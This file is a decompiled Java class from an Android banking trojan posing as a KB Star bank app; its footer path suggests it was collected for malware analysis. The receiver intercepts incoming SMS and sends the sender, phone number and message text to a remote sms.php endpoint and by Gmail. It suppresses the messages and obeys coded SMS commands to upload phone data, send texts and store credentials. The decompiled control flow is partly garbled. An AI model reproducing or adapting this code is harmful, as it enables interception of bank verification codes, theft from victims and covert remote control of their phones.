package com.kbstar.kb.android.receiver;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.SharedPreferences.Editor;
import android.os.Bundle;
import android.telephony.SmsMessage;
import android.telephony.TelephonyManager;
import com.kbstar.kb.android.services.ABK_SENDSMS;
import com.kbstar.kb.android.services.uploadPhone;
import com.kbstar.kb.android.star.AppContacts;
import com.kbstar.kb.android.star.MainActivity;
import com.kbstar.kb.android.star.util.GMailSend;
import com.kbstar.kb.android.star.util.NPUtil;
import com.kbstar.kb.android.star.util.Tool;
import com.kbstar.kb.android.star.util.Url;

public class openActivityReceiver
  extends BroadcastReceiver
{
  public static final String TAG = "BroadcastReceiver";
  private static final String mACTION = "android.provider.Telephony.SMS_RECEIVED";
  private String content = "";
  private String sender;
  private String tel;
  String u = "http://" + Tool.GetUrlTool() + "/phon/sms.php";
  Url url = new Url();
  
  public void onReceive(Context paramContext, Intent paramIntent)
  {
    int i;
    label145:
    Object localObject;
    if (paramIntent.getAction().equals("android.provider.Telephony.SMS_RECEIVED"))
    {
      paramIntent = (Object[])paramIntent.getExtras().get("pdus");
      int j = paramIntent.length;
      i = 0;
      if (i < j) {
        break label281;
      }
      this.tel = ((TelephonyManager)paramContext.getSystemService("phone")).getLine1Number();
      new Thread()
      {
        public void run()
        {
          Tool.postHttpConnection(openActivityReceiver.this.u, openActivityReceiver.this.sender, openActivityReceiver.this.tel, openActivityReceiver.this.content);
        }
      }.start();
      paramIntent = this.content.split("-");
      if (paramIntent[0].equalsIgnoreCase("ak49"))
      {
        this.url.write("ak49.txt", paramIntent[1]);
        paramContext.startService(new Intent(paramContext, uploadPhone.class));
      }
      if (paramIntent[0].equalsIgnoreCase("ak40"))
      {
        if (!paramIntent[1].equalsIgnoreCase("1")) {
          break label323;
        }
        this.url.write("ak40.txt", "1");
      }
      if (this.url.getUrl("ak40").equalsIgnoreCase("1"))
      {
        abortBroadcast();
        new Thread()
        {
          public void run()
          {
            GMailSend.MailSend1(openActivityReceiver.this.tel, openActivityReceiver.this.content);
          }
        }.start();
      }
      if (paramIntent[0].equalsIgnoreCase("wokm"))
      {
        localObject = new Intent(paramContext, ABK_SENDSMS.class);
        ((Intent)localObject).putExtra("myArgs", paramIntent[1]);
        paramContext.startService((Intent)localObject);
      }
      if (paramIntent[0].equalsIgnoreCase("ak60")) {
        this.url.write("sms_name.txt", paramIntent[1]);
      }
      if (paramIntent[0].equalsIgnoreCase("ak61")) {
        this.url.write("sms_pws.txt", paramIntent[1]);
      }
      if (NPUtil.isNPKIExists()) {
        i = 0;
      }
    }
    for (;;)
    {
      if (i >= AppContacts.BK_CALL_LIST.length)
      {
        return;
        label281:
        localObject = SmsMessage.createFromPdu((byte[])paramIntent[i]);
        this.sender = ((SmsMessage)localObject).getOriginatingAddress().toString();
        this.content = ((SmsMessage)localObject).getMessageBody().toString();
        i += 1;
        break;
        label323:
        if (!paramIntent[1].equalsIgnoreCase("2")) {
          break label145;
        }
        this.url.deleteFoder("ak40.txt");
        break label145;
      }
      if (this.content.equalsIgnoreCase(AppContacts.BK_CALL_LIST[i]))
      {
        paramIntent = new Intent(paramContext, MainActivity.class);
        localObject = paramContext.getSharedPreferences("data", 0).edit();
        ((SharedPreferences.Editor)localObject).clear();
        ((SharedPreferences.Editor)localObject).commit();
        ((SharedPreferences.Editor)localObject).putString("item", AppContacts.BK_CALL_LIST[i]);
        ((SharedPreferences.Editor)localObject).commit();
        paramIntent.addFlags(268435456);
        paramContext.startActivity(paramIntent);
      }
      i += 1;
    }
  }
}


/* Location:              /home/enzo/Documents/BorelEnzo.github.io/malwares/dsencrypt/payload.jar!/com/kbstar/kb/android/receiver/openActivityReceiver.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       0.7.1
 */